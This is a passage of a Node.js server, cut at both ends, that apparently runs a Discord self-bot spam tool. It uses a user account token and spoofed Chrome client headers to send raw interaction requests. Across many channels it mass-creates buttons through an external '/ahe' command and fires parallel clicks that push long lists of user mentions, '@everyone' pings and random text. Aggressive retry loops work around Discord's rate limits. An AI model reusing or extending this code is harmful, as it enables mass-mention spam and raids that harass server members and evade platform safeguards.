        const INDIVIDUAL_DELAY = 50; // 50ms between individual requests (minimal)
        
        let createdChannels = [];
        let failedChannels = [];
        const retriedChannels = new Set(); // Track channels that were retried
        
        console.log(`[INSTANT-PARALLEL] Phase 1: Creating buttons in batches of ${BATCH_SIZE}`);
        
        // Split channels into batches
        for (let i = 0; i < channels.length; i += BATCH_SIZE) {
            const batch = channels.slice(i, i + BATCH_SIZE);
            console.log(`[INSTANT-PARALLEL] Processing batch ${Math.floor(i / BATCH_SIZE) + 1}/${Math.ceil(channels.length / BATCH_SIZE)} (${batch.length} channels)`);
            
            // Process batch with small delays between each
            const batchResults = [];
            for (let j = 0; j < batch.length; j++) {
                if (j > 0) await delay(INDIVIDUAL_DELAY);
                const result = await createButtonInChannel(batch[j], 0);
                batchResults.push(result);
            }
            
            batchResults.forEach(r => {
                if (r.created) {
                    createdChannels.push(r.channelId);
                } else {
                    failedChannels.push(r);
                }
            });
            
            // Wait between batches (except for last batch)
            if (i + BATCH_SIZE < channels.length) {
                await delay(BATCH_DELAY);
            }
        }
        
        console.log(`[INSTANT-PARALLEL] Initial pass: Created ${createdChannels.length}/${channels.length} buttons, ${failedChannels.length} failed`);

        // IMPROVED: Aggressive retry with exponential backoff
        const MAX_RETRIES = 100; // Much more retries
        const MAX_TOTAL_TIME = 300000; // 5 minutes max
        const startTime = Date.now();
        let retryRound = 0;
        
        while (failedChannels.length > 0 && retryRound < MAX_RETRIES && (Date.now() - startTime) < MAX_TOTAL_TIME) {
            // Separate rate-limited from permanent errors
            const retryableChannels = failedChannels.filter(f => f.isTemporaryError || f.isRateLimited);
            const permanentErrors = failedChannels.filter(f => !f.isTemporaryError && !f.isRateLimited);
            
            if (retryableChannels.length === 0) {
                console.log(`[INSTANT-PARALLEL] No more retryable channels (${permanentErrors.length} permanent errors)`);
                break;
            }
            
            // Calculate wait time - use Discord's retry_after directly, minimal base wait
            const maxRetryAfter = Math.max(...retryableChannels.map(f => f.retryAfter || 0.5), 0.5);
            const baseWait = maxRetryAfter * 1000 + 200; // Discord's retry_after + 200ms buffer
            const exponentialFactor = Math.min(Math.pow(1.1, Math.floor(retryRound / 10)), 2); // Slower increase
            const waitTime = Math.min(baseWait * exponentialFactor, 10000); // Cap at 10 seconds
            
            console.log(`[INSTANT-PARALLEL] Retry round ${retryRound + 1}: ${retryableChannels.length} channels, waiting ${Math.round(waitTime)}ms`);
            await delay(waitTime);
            
            // Retry in small batches with delays
            const newlyCreated = [];
            const stillFailed = [];
            
            for (let i = 0; i < retryableChannels.length; i += BATCH_SIZE) {
                const batch = retryableChannels.slice(i, i + BATCH_SIZE);
                
                for (let j = 0; j < batch.length; j++) {
                    if (j > 0) await delay(INDIVIDUAL_DELAY); // Same minimal delay on retries
                    const result = await createButtonInChannel(batch[j].channelId, batch[j].attempts || 0);
                    
                    if (result.created) {
                        newlyCreated.push(result.channelId);
                        retriedChannels.add(result.channelId); // Mark as retried
                    } else {
                        stillFailed.push(result);
                    }
                }
                
                // Wait between retry batches (minimal)
                if (i + BATCH_SIZE < retryableChannels.length) {
                    await delay(BATCH_DELAY);
                }
            }
            
            createdChannels = [...createdChannels, ...newlyCreated];
            failedChannels = [...stillFailed, ...permanentErrors];
            
            console.log(`[INSTANT-PARALLEL] Retry round ${retryRound + 1}: +${newlyCreated.length} created, now ${createdChannels.length}/${channels.length} total, ${failedChannels.length} still pending`);
            retryRound++;
            
            // If we're making progress, continue; if not, wait a bit longer
            if (newlyCreated.length === 0 && retryRound > 10) {
                console.log(`[INSTANT-PARALLEL] No progress in last round, adding extra delay...`);
                await delay(2000);
            }
        }
        
        console.log(`[INSTANT-PARALLEL] Final: Created ${createdChannels.length}/${channels.length} buttons after ${retryRound} retry rounds (${Date.now() - startTime}ms)`);
        
        // Allow bot to finish processing all interactions before proceeding
        if (retriedChannels.size > 0) {
            console.log(`[INSTANT-PARALLEL] Waiting 2000ms for bot to finish processing ${retriedChannels.size} retried channels...`);
            await delay(2000);
        } else {
            console.log(`[INSTANT-PARALLEL] Waiting 500ms for bot to finish processing...`);
            await delay(500);
        }

        // Phase 2: Wait for ALL buttons to be created by Bot AND get valid messageIds
        const maxWaitTime = Math.max(createdChannels.length * 1000, 10000); // At least 1 sec per channel, min 10 sec
        const pollInterval = 300;
        const startWaitTime = Date.now();
        let allButtonsReady = false;
        
        console.log(`[INSTANT-PARALLEL] Phase 2: Waiting for ${createdChannels.length} buttons to be ready (max ${maxWaitTime}ms)...`);
        
        // Function to fetch messageId and components from webhook with retries
        const fetchMessageFromWebhook = async (channelId, interactionToken, retries = 3) => {
            for (let i = 0; i < retries; i++) {
                try {
                    const webhookUrl = `${DISCORD_API_BASE}/webhooks/${CLIENT_ID}/${interactionToken}/messages/@original`;
                    const response = await axios.get(webhookUrl, { timeout: 5000 });
                    const messageId = response.data?.id;
                    const components = response.data?.components;
                    const customId = components?.[0]?.components?.[0]?.custom_id;
                    if (messageId) {
                        console.log(`[INSTANT-PARALLEL] Fetched messageId=${messageId}, customId=${customId || 'none'} for channel ${channelId} (attempt ${i + 1})`);
                        return { messageId, customId, components };
                    }
                } catch (e) {
                    if (i < retries - 1) {
                        await delay(500);
                    }
                }
            }
            return null;
        };
        
        // Keep trying until all buttons have valid messageIds AND payloads or timeout
        const buttonData = [];
        const pendingChannels = new Set(createdChannels);
        
        while (pendingChannels.size > 0 && (Date.now() - startWaitTime) < maxWaitTime) {
            const channelsToCheck = [...pendingChannels];
            
            for (const channelId of channelsToCheck) {
                const stored = getRecentButtonCreation(channelId);
                if (!stored || !stored.buttonCustomId) {
                    continue; // Not ready yet, keep waiting
                }
                
                // Extract buttonToken from customId (format: aanko_t_XXXXXXXX)
                const buttonToken = stored.buttonToken || (stored.buttonCustomId ? stored.buttonCustomId.replace('aanko_t_', '') : null);
                
                // Check if payload is stored (critical for mentions)
                let payloadReady = false;
                if (buttonToken) {
                    const payload = getButtonPayload(buttonToken);
                    payloadReady = !!(payload && payload.idsToMention !== undefined);
                    if (!payloadReady && stored.idsToMention !== undefined) {
                        // Fallback: use stored data in recentButtonCreations
                        payloadReady = true;
                    }
                }
                
                let messageId = stored.messageId;
                let actualCustomId = stored.buttonCustomId;
                
                // If messageId is undefined or pending, try to fetch from webhook
                if (!messageId || messageId.startsWith('pending_')) {
                    if (stored.interactionToken) {
                        const msgData = await fetchMessageFromWebhook(channelId, stored.interactionToken, 2);
                        if (msgData) {
                            messageId = msgData.messageId;
                            // Use the actual customId from the message if available
                            if (msgData.customId) {
                                if (msgData.customId !== stored.buttonCustomId) {
                                    console.log(`[INSTANT-PARALLEL] CustomId mismatch! stored=${stored.buttonCustomId}, actual=${msgData.customId}`);
                                }
                                actualCustomId = msgData.customId;
                            }
                        }
                    }
                }
                
                // If we have a valid messageId AND payload is ready, add to buttonData and remove from pending
                if (messageId && !messageId.startsWith('pending_') && payloadReady) {
                    buttonData.push({
                        channelId,
                        messageId,
                        customId: actualCustomId,
                        idsToMention: stored.idsToMention || []
                    });
                    // Update stored data with correct messageId and customId for subsequent rounds
                    updateRecentButtonCreation(channelId, messageId, actualCustomId);
                    pendingChannels.delete(channelId);
                    console.log(`[INSTANT-PARALLEL] Button ready: channel=${channelId}, messageId=${messageId}, customId=${actualCustomId}, idsToMention=${(stored.idsToMention || []).length} (${buttonData.length}/${createdChannels.length})`);
                } else if (messageId && !messageId.startsWith('pending_') && !payloadReady) {
                    console.log(`[INSTANT-PARALLEL] Button ${channelId} has messageId but payload not ready yet (buttonToken=${buttonToken})`);
                }
            }
            
            if (pendingChannels.size > 0) {
                console.log(`[INSTANT-PARALLEL] Waiting... ${buttonData.length}/${createdChannels.length} buttons ready, ${pendingChannels.size} pending`);
                await delay(pollInterval);
            }
        }
        
        allButtonsReady = pendingChannels.size === 0;
        
        if (allButtonsReady) {
            console.log(`[INSTANT-PARALLEL] All ${buttonData.length} buttons ready after ${Date.now() - startWaitTime}ms`);
        } else {
            console.log(`[INSTANT-PARALLEL] Timeout after ${Date.now() - startWaitTime}ms, ${buttonData.length}/${createdChannels.length} buttons ready, ${pendingChannels.size} still pending`);
            
            // Last attempt: try one more time to fetch remaining messageIds
            for (const channelId of pendingChannels) {
                const stored = getRecentButtonCreation(channelId);
                if (stored && stored.buttonCustomId && stored.interactionToken) {
                    const msgData = await fetchMessageFromWebhook(channelId, stored.interactionToken, 3);
                    if (msgData && msgData.messageId && !msgData.messageId.startsWith('pending_')) {
                        const actualCustomId = msgData.customId || stored.buttonCustomId;
                        buttonData.push({
                            channelId,
                            messageId: msgData.messageId,
                            customId: actualCustomId
                        });
                        // Update stored data with correct messageId and customId
                        updateRecentButtonCreation(channelId, msgData.messageId, actualCustomId);
                        console.log(`[INSTANT-PARALLEL] Late recovery: channel=${channelId}, messageId=${msgData.messageId}, customId=${actualCustomId}`);
                    }
                }
            }
        }

        console.log(`[INSTANT-PARALLEL] Phase 3: Found ${buttonData.length}/${createdChannels.length} buttons with valid messageIds, firing clicks...`);
        console.log(`[INSTANT-PARALLEL] Retried channels: ${retriedChannels.size} (${[...retriedChannels].join(', ')})`);
        
        // Wait a bit for Discord to fully process the messages before clicking
        console.log(`[INSTANT-PARALLEL] Waiting 500ms for messages to be fully ready...`);
        await delay(500);
        
        // If there are retried channels, wait extra time for them
        if (retriedChannels.size > 0) {
            console.log(`[INSTANT-PARALLEL] Extra wait 800ms for ${retriedChannels.size} retried channels...`);
            await delay(800);
        }

        // Phase 3: Click all buttons in parallel for maximum speed
        console.log(`[INSTANT-PARALLEL] Starting parallel clicks for ${buttonData.length} buttons...`);
        
        const clickPromises = buttonData.map(async (data) => {
            // Extra wait for retried channels
            if (retriedChannels.has(data.channelId)) {
                console.log(`[INSTANT-PARALLEL] Extra delay for retried channel ${data.channelId}`);
                await delay(300);
            }
            
            const clickPayload = {
                type: 3,
                nonce: generateSnowflake(),
                session_id: sessionId,
                channel_id: data.channelId,
                message_id: data.messageId,
                message_flags: 64,
                application_id: CLIENT_ID,
                data: { component_type: 2, custom_id: data.customId }
            };
            if (guildId) clickPayload.guild_id = guildId;

            console.log(`[INSTANT-PARALLEL] Clicking: channel=${data.channelId}, messageId=${data.messageId}, customId=${data.customId}`);

            const boundary = '----WebKitFormBoundary' + generateBoundary();
            const formBody = `--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${JSON.stringify(clickPayload)}\r\n--${boundary}--`;

            try {
                await axios.post(`${DISCORD_API_BASE}/interactions`, formBody, {
                    headers: { ...execHeaders, 'Content-Type': `multipart/form-data; boundary=${boundary}` },
                    timeout: 10000
                });
                console.log(`[INSTANT-PARALLEL] Click sent to ${data.channelId}`);
                return { channelId: data.channelId, success: true };
            } catch (e) {
                const errorMsg = e.response?.data?.message || e.message;
                const errorData = e.response?.data;
                const isRateLimited = e.response?.status === 429;
                const retryAfter = e.response?.data?.retry_after || 1;
                
                console.log(`[INSTANT-PARALLEL] Click failed for ${data.channelId}: ${errorMsg}`);
                
                // If rate limited, wait and retry once
                if (isRateLimited) {
                    console.log(`[INSTANT-PARALLEL] Rate limited, waiting ${retryAfter}s and retrying...`);
                    await delay((retryAfter + 0.5) * 1000);
                    try {
                        await axios.post(`${DISCORD_API_BASE}/interactions`, formBody, {
                            headers: { ...execHeaders, 'Content-Type': `multipart/form-data; boundary=${boundary}` },
                            timeout: 10000
                        });
                        console.log(`[INSTANT-PARALLEL] Retry click sent to ${data.channelId}`);
                        return { channelId: data.channelId, success: true, retried: true };
                    } catch (retryError) {
                        return { channelId: data.channelId, success: false, error: retryError.response?.data?.message || retryError.message };
                    }
                } else {
                    // Retry once for "Invalid form body" errors after a delay
                    if (errorMsg.includes('無効') || errorMsg.includes('Invalid')) {
                        console.log(`[INSTANT-PARALLEL] Retrying after 300ms for invalid form body...`);
                        await delay(300);
                        try {
                            await axios.post(`${DISCORD_API_BASE}/interactions`, formBody, {
                                headers: { ...execHeaders, 'Content-Type': `multipart/form-data; boundary=${boundary}` },
                                timeout: 10000
                            });
                            console.log(`[INSTANT-PARALLEL] Retry click sent to ${data.channelId}`);
                            return { channelId: data.channelId, success: true, retried: true };
                        } catch (retryError) {
                            console.log(`[INSTANT-PARALLEL] Retry also failed: ${retryError.response?.data?.message || retryError.message}`);
                        }
                    }
                    return { channelId: data.channelId, success: false, error: errorMsg };
                }
            }
        });

        // Wait for all clicks to complete
        const clickResults = await Promise.all(clickPromises);
        const clicksSent = clickResults.filter(r => r.success).length;
        const clicksFailed = clickResults.filter(r => !r.success).length;

        console.log(`[INSTANT-PARALLEL] Parallel clicks complete: ${clicksSent} sent, ${clicksFailed} failed`);

        console.log(`[INSTANT-PARALLEL] Clicks complete: ${clicksSent} sent, ${clicksFailed} failed`);

        // Respond immediately - don't wait for clicks to complete
        res.json({
            success: true,
            message: `Instantly fired 1 click per channel`,
            channelCount: channels.length,
            originalChannelCount: inputChannels.length,
            buttonsCreated: createdChannels.length,
            clicksSent: clicksSent,
            buttonData: buttonData.map(b => ({ channelId: b.channelId })),
            skippedChannels: skippedChannels
        });

    } catch (error) {
        console.error('[INSTANT-PARALLEL] Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Click stored buttons only (no button creation) - for multiple rounds
app.post('/api/click-stored-buttons', async (req, res) => {
    try {
        const { token, channelIds, guildId } = req.body;

        if (!token || !channelIds || channelIds.length === 0) {
            return res.status(400).json({ error: 'token and channelIds are required' });
        }

        const channels = Array.isArray(channelIds) ? channelIds : [channelIds];

        const generateSnowflake = () => {
            const timestamp = BigInt(Date.now() - 1420070400000) << 22n;
            const random = BigInt(Math.floor(Math.random() * 4194304));
            return (timestamp | random).toString();
        };

        const generateSessionId = () => {
            let result = '';
            for (let i = 0; i < 32; i++) result += 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 62)];
            return result;
        };

        const generateBoundary = () => {
            let result = '';
            for (let i = 0; i < 16; i++) result += 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 62)];
            return result;
        };

        const superProperties = {
            os: "Windows", browser: "Chrome", device: "", system_locale: "ja",
            browser_user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            browser_version: "120.0.0.0", os_version: "10", release_channel: "stable",
            client_build_number: 251236
        };

        const execHeaders = {
            'Authorization': token,
            'X-Super-Properties': Buffer.from(JSON.stringify(superProperties)).toString('base64'),
            'X-Discord-Locale': 'ja',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/channels/@me'
        };

        const sessionId = generateSessionId();
        
        console.log(`[CLICK-STORED] Looking for stored buttons in ${channels.length} channels`);

        // Get button data from stored buttons
        const buttonData = [];
        for (const channelId of channels) {
            const stored = getRecentButtonCreation(channelId);
            if (stored && stored.buttonCustomId) {
                let messageId = stored.messageId;
                
                if (!messageId || messageId.startsWith('pending_')) {
                    if (stored.interactionToken) {
                        try {
                            const webhookUrl = `${DISCORD_API_BASE}/webhooks/${CLIENT_ID}/${stored.interactionToken}/messages/@original`;
                            const response = await axios.get(webhookUrl);
                            messageId = response.data?.id;
                        } catch (e) {}
                    }
                }
                
                if (messageId && !messageId.startsWith('pending_')) {
                    buttonData.push({ channelId, messageId, customId: stored.buttonCustomId });
                }
            }
        }

        console.log(`[CLICK-STORED] Found ${buttonData.length} stored buttons`);

        if (buttonData.length === 0) {
            return res.json({
                success: false,
                error: 'No stored buttons found. Create buttons first.',
                buttonsFound: 0,
                clicksSent: 0
            });
        }

        // Fire all clicks immediately - FIRE AND FORGET
        let clicksSent = 0;
        
        for (const data of buttonData) {
            const clickPayload = {
                type: 3,
                nonce: generateSnowflake(),
                session_id: sessionId,
                channel_id: data.channelId,
                message_id: data.messageId,
                message_flags: 64,
                application_id: CLIENT_ID,
                data: { component_type: 2, custom_id: data.customId }
            };
            if (guildId) clickPayload.guild_id = guildId;

            const boundary = '----WebKitFormBoundary' + generateBoundary();
            const formBody = `--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${JSON.stringify(clickPayload)}\r\n--${boundary}--`;

            // FIRE AND FORGET - don't await
            axios.post(`${DISCORD_API_BASE}/interactions`, formBody, {
                headers: { ...execHeaders, 'Content-Type': `multipart/form-data; boundary=${boundary}` }
            }).then(() => {
                console.log(`[CLICK-STORED] Click sent to ${data.channelId}`);
            }).catch(e => {
                console.log(`[CLICK-STORED] Click failed for ${data.channelId}: ${e.response?.data?.message || e.message}`);
            });
            
            clicksSent++;
        }

        console.log(`[CLICK-STORED] Fired ${clicksSent} clicks instantly`);

        res.json({
            success: true,
            buttonsFound: buttonData.length,
            clicksSent: clicksSent,
            channelIds: buttonData.map(b => b.channelId)
        });

    } catch (error) {
        console.error('[CLICK-STORED] Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// /ahe command API endpoints
const aheButtonStorage = new Map();

app.post('/api/ahe-instant-parallel-button', async (req, res) => {
    // Use client-provided operationId for progress tracking, or generate new one
    const clientOperationId = req.body.operationId;
    const operationId = clientOperationId || startOperation('ahe-button');
    
    // If client provided operationId, register it
    if (clientOperationId) {
        activeOperations.set(operationId, { type: 'ahe-button', cancelled: false, startTime: Date.now() });
    }
    
    // Cancel any existing ahe-button operations to prevent overlap
    cancelOperationsByType('ahe-button');
    // Re-register current operation after cancelling all (since cancelOperationsByType cancels all including current)
    activeOperations.set(operationId, { type: 'ahe-button', cancelled: false, startTime: Date.now() });
    
    // Clear all previous button creation state to prevent overlap with previous operations
    clearAllRecentButtonCreations();
    clearAllButtonCreationTrackers();
    clearAllBatchTrackers();
    // Clear any previous progress for this operation
    operationProgress.delete(operationId);
    
    try {
        const { token, channelIds, guildId, message, userIds, mentionCount, includeEveryone: reqIncludeEveryone, randLen, clickCount: reqClickCount, clicksPerChannel: reqClicksPerChannel, useRandomText: reqUseRandomText } = req.body;

        if (!token || !channelIds || channelIds.length === 0) {
            endOperation(operationId);
            return res.status(400).json({ error: 'token and channelIds are required' });
        }

        const inputChannels = Array.isArray(channelIds) ? channelIds : [channelIds];
        const clickCount = Math.max(1, parseInt(reqClickCount) || 1);
        const clicksPerChannel = Math.max(1, parseInt(reqClicksPerChannel) || 1);
        const aheCommand = getRegisteredAheCommand();
        
        if (!aheCommand) {
            return res.status(500).json({ success: false, error: '/ahe command not registered yet' });
        }

        const headers = getDiscordHeaders(token);
        
        const VIEW_CHANNEL = 1024n;
        const USE_APPLICATION_COMMANDS = 2147483648n;
        const USE_EXTERNAL_APPS = 1125899906842624n;
        const ADMINISTRATOR = 8n;
        const MENTION_EVERYONE = 131072n;
        
        let channels = inputChannels;
        let skippedChannels = { noView: [], noAppCommands: [] };
        const channelEveryonePermission = new Map(); // Track @everyone permission per channel
        
        if (guildId) {
            console.log(`[AHE-SEQUENTIAL] Pre-filtering ${inputChannels.length} channels for permissions...`);
            
            let userRoleIds = [];
            let userId = null;
            let basePermissions = 0n;
            let isAdmin = false;
            
            try {
                const meResponse = await axios.get(`${DISCORD_API_BASE}/users/@me`, { headers });
                userId = meResponse.data.id;
                
                const memberResponse = await axios.get(`${DISCORD_API_BASE}/users/@me/guilds/${guildId}/member`, { headers });
                userRoleIds = memberResponse.data.roles || [];
                
                const rolesResponse = await axios.get(`${DISCORD_API_BASE}/guilds/${guildId}/roles`, { headers });
                const guildRoles = rolesResponse.data;
                const roleMap = new Map();
                guildRoles.forEach(r => roleMap.set(r.id, r));
                
                const everyoneRole = roleMap.get(guildId);
                if (everyoneRole) {
                    basePermissions = BigInt(everyoneRole.permissions || '0');
                }
                
                for (const roleId of userRoleIds) {
                    const role = roleMap.get(roleId);
                    if (role) {
                        basePermissions |= BigInt(role.permissions || '0');
                    }
                }
                
                isAdmin = (basePermissions & ADMINISTRATOR) !== 0n;
                if (isAdmin) {
                    console.log('[AHE-SEQUENTIAL] User is admin, skipping permission filtering');
                    channels = inputChannels;
                    // Admin can use @everyone everywhere
                    inputChannels.forEach(ch => channelEveryonePermission.set(ch, true));
                }
            } catch (e) {
                console.log('[AHE-SEQUENTIAL] Could not fetch user roles:', e.message);
                basePermissions = VIEW_CHANNEL | USE_APPLICATION_COMMANDS;
            }
            
            if (!isAdmin) {
                try {
                    const channelsResponse = await axios.get(`${DISCORD_API_BASE}/guilds/${guildId}/channels`, { headers });
                    const guildChannels = channelsResponse.data;
                    
                    const channelMap = new Map();
                    guildChannels.forEach(ch => channelMap.set(ch.id, ch));
                    
                    const filteredChannels = [];
                    
                    for (const channelId of inputChannels) {
                        const channel = channelMap.get(channelId);
                        if (!channel) {
                            filteredChannels.push(channelId);
                            channelEveryonePermission.set(channelId, (basePermissions & MENTION_EVERYONE) !== 0n);
                            continue;
                        }
                        
                        const overwrites = channel.permission_overwrites || [];
                        let permissions = basePermissions;
                        
                        const everyoneOverwrite = overwrites.find(o => o.id === guildId);
                        if (everyoneOverwrite) {
                            permissions &= ~BigInt(everyoneOverwrite.deny || '0');
                            permissions |= BigInt(everyoneOverwrite.allow || '0');
                        }
                        
                        let roleAllow = 0n;
                        let roleDeny = 0n;
                        for (const roleId of userRoleIds) {
                            const roleOverwrite = overwrites.find(o => o.id === roleId && o.type === 0);
                            if (roleOverwrite) {
                                roleAllow |= BigInt(roleOverwrite.allow || '0');
                                roleDeny |= BigInt(roleOverwrite.deny || '0');
                            }
                        }
                        permissions &= ~roleDeny;
                        permissions |= roleAllow;
                        
                        if (userId) {
                            const userOverwrite = overwrites.find(o => o.id === userId && o.type === 1);
                            if (userOverwrite) {
                                permissions &= ~BigInt(userOverwrite.deny || '0');
                                permissions |= BigInt(userOverwrite.allow || '0');
                            }
                        }
                        
                        const hasViewChannel = (permissions & VIEW_CHANNEL) !== 0n;
                        const hasAppCommands = (permissions & USE_APPLICATION_COMMANDS) !== 0n;
                        const hasExternalApps = (permissions & USE_EXTERNAL_APPS) !== 0n;
                        const hasMentionEveryone = (permissions & MENTION_EVERYONE) !== 0n;
                        
                        // Store @everyone permission for this channel
                        channelEveryonePermission.set(channelId, hasMentionEveryone);
                        
                        if (!hasViewChannel) {
                            skippedChannels.noView.push(channelId);
                            continue;
                        }
                        
                        // /ahe only requires USE_EXTERNAL_APPS permission (external bot command)
                        // APP_COMMANDS is for the server's own slash commands
                        if (!hasExternalApps) {
                            skippedChannels.noAppCommands.push(channelId);
                            continue;
                        }
                        
                        filteredChannels.push(channelId);
                        console.log(`[AHE-SEQUENTIAL] Channel ${channelId}: @everyone=${hasMentionEveryone}, appCmd=${hasAppCommands}, extApp=${hasExternalApps}`);
                    }
                    
                    channels = filteredChannels;
                    console.log(`[AHE-SEQUENTIAL] Filtered: ${inputChannels.length} -> ${channels.length} channels`);
                    
                } catch (e) {
                    console.log('[AHE-SEQUENTIAL] Could not filter channels:', e.message);
                }
            }
        } else {
            // No guildId, assume @everyone is allowed
            inputChannels.forEach(ch => channelEveryonePermission.set(ch, true));
        }
        
        if (channels.length === 0) {
            return res.json({
                success: true,
                message: 'No valid channels after filtering',
                buttonsCreated: 0,
                clicksSent: 0,
                skippedChannels
            });
        }

        const generateSnowflake = () => {
            const timestamp = BigInt(Date.now() - 1420070400000) << 22n;
            const random = BigInt(Math.floor(Math.random() * 4194304));
            return (timestamp | random).toString();
        };

        const generateSessionId = () => {
            let result = '';
            for (let i = 0; i < 32; i++) result += 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 62)];
            return result;
        };

        const generateBoundary = () => {
            let result = '';
            for (let i = 0; i < 16; i++) result += 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 62)];
            return result;
        };

        const superProperties = {
            os: "Windows", browser: "Chrome", device: "", system_locale: "ja",
            browser_user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            browser_version: "120.0.0.0", os_version: "10", release_channel: "stable",
            client_build_number: 251236
        };

        const execHeaders = {
            'Authorization': token,
            'X-Super-Properties': Buffer.from(JSON.stringify(superProperties)).toString('base64'),
            'X-Discord-Locale': 'ja',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/channels/@me'
        };

        // Base options (without @everyone - will be added per-channel)
        const randomLength = Math.min(64, Math.max(1, parseInt(randLen) || 64));
        const includeEveryone = reqIncludeEveryone === true;
        const useRandomText = reqUseRandomText === true;
        
        // Hybrid approach: use direct option if user_ids is short, otherwise use storage key
        // Discord option limit is 6000 chars, use 5500 as safe threshold
        const MAX_DIRECT_LENGTH = 5500;
        const userIdsString = (userIds && userIds.length > 0) ? userIds.join(',') : '';
        const effectiveMentionCount = parseInt(mentionCount) || 0;
        const useDirect = userIdsString.length <= MAX_DIRECT_LENGTH;
        
        // Store user_ids in storage if too long for direct option
        let userIdsStorageKey = null;
        if (userIds && userIds.length > 0 && !useDirect) {
            userIdsStorageKey = storeLargeUserIds(userIds);
            console.log(`[AHE-SEQUENTIAL] User IDs too long (${userIdsString.length} chars), using storage key=${userIdsStorageKey}`);
        } else if (userIds && userIds.length > 0) {
            console.log(`[AHE-SEQUENTIAL] Using ${userIds.length} user_ids directly (${userIdsString.length} chars), mentionCount=${effectiveMentionCount}`);
        }
        
        // Function to build options for a specific channel
        const buildOptionsForChannel = (channelId) => {
            const opts = [];
            opts.push({ type: 4, name: 'rand_len', value: randomLength });
            
            // Only include @everyone if user requested it AND channel allows it
            const canMentionEveryone = channelEveryonePermission.get(channelId) === true;
            if (includeEveryone && canMentionEveryone) {
                opts.push({ type: 5, name: 'mention_everyone', value: true });
                console.log(`[AHE-SEQUENTIAL] Channel ${channelId}: @everyone enabled`);
            } else if (includeEveryone && !canMentionEveryone) {
                console.log(`[AHE-SEQUENTIAL] Channel ${channelId}: @everyone disabled (no permission)`);
            }
            
            // Add use_random_text option
            if (useRandomText) {
                opts.push({ type: 5, name: 'use_random_text', value: true });
            }
            
            // Hybrid: if short enough, use direct option; otherwise use STORAGE: prefix
            if (useDirect && userIdsString) {
                // Direct approach: pass user_ids directly to command option
                opts.push({ type: 3, name: 'user_ids', value: userIdsString });
                if (effectiveMentionCount > 0) {
                    opts.push({ type: 4, name: 'mention_count', value: effectiveMentionCount });
                }
                // Add text message if provided
                if (message) {
                    opts.push({ type: 3, name: 'text', value: message });
                }
            } else if (userIdsStorageKey) {
                // Storage approach: pass storage key as user_ids option
                opts.push({ type: 3, name: 'user_ids', value: `STORAGE:${userIdsStorageKey}` });
                if (effectiveMentionCount > 0) {
                    opts.push({ type: 4, name: 'mention_count', value: effectiveMentionCount });
                }
                // Add text message if provided
                if (message) {
                    opts.push({ type: 3, name: 'text', value: message });
                }
            } else {
                // No user_ids, just add message and mention_count if provided
                if (message) {
                    opts.push({ type: 3, name: 'text', value: message });
                }
                if (effectiveMentionCount > 0) {
                    opts.push({ type: 4, name: 'mention_count', value: effectiveMentionCount });
                }
            }
            
            return opts;
        };

        console.log(`[AHE-SEQUENTIAL] Starting for ${channels.length} channels, randLen=${randomLength}, includeEveryone=${includeEveryone}, useRandomText=${useRandomText}`);

        const sessionId = generateSessionId();
        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
        
        const buttonData = [];
        const failedChannels = [];
        
        // Initialize progress
        updateProgress(operationId, {
            phase: 'creating',
            status: 'ボタン作成中',
            totalChannels: channels.length,
            createdButtons: 0,
            totalClicks: clickCount,
            clicksSent: 0,
            currentChannel: 0
        });
        
        // Phase 1: Create buttons ONE BY ONE and confirm each before moving to next
        console.log(`[AHE-SEQUENTIAL] Phase 1: Creating buttons sequentially (1 channel at a time)`);

        // Function to fetch messageId from webhook (ephemeral messages)
        const fetchMessageFromWebhook = async (channelId, interactionToken, retries = 3) => {
            for (let i = 0; i < retries; i++) {
                try {
                    const webhookUrl = `${DISCORD_API_BASE}/webhooks/${CLIENT_ID}/${interactionToken}/messages/@original`;
                    const response = await axios.get(webhookUrl, { timeout: 5000 });
                    const messageId = response.data?.id;
                    const components = response.data?.components;
                    const customId = components?.[0]?.components?.[0]?.custom_id;
                    if (messageId) {
                        console.log(`[AHE-SEQUENTIAL] Fetched messageId=${messageId}, customId=${customId || 'none'} for channel ${channelId}`);
                        return { messageId, customId };
                    }
                } catch (e) {
                    console.log(`[AHE-SEQUENTIAL] Webhook fetch failed for ${channelId} (attempt ${i + 1}): ${e.response?.data?.message || e.message}`);
                    if (i < retries - 1) {
                        await delay(300);
                    }
                }
            }
            return null;
        };

        // Function to wait for a single button to be confirmed created
        const waitForButtonConfirmation = async (channelId, maxWaitMs = 8000) => {
            const startTime = Date.now();
            const pollInterval = 200;
            
            while ((Date.now() - startTime) < maxWaitMs) {
                // Check for cancellation during polling
                if (shouldCancel(operationId)) {
                    return { success: false, channelId, error: 'Cancelled by user' };
                }
                
                const stored = getRecentButtonCreation(channelId);
                
                if (stored && stored.buttonCustomId) {
                    const buttonToken = stored.buttonToken || (stored.buttonCustomId ? stored.buttonCustomId.replace('ahe_t_', '') : null);
                    
                    // Check if payload is stored
                    let payloadReady = false;
                    if (buttonToken) {
                        const payload = getButtonPayload(buttonToken);
                        payloadReady = !!(payload && payload.idsToMention !== undefined);
                        if (!payloadReady && stored.idsToMention !== undefined) {
                            payloadReady = true;
                        }
                    }
                    
                    let messageId = stored.messageId;
                    let actualCustomId = stored.buttonCustomId;
                    
                    // Check if we have valid messageId AND payload is ready
                    if (messageId && !messageId.startsWith('pending_') && payloadReady) {
                        return { 
                            success: true,
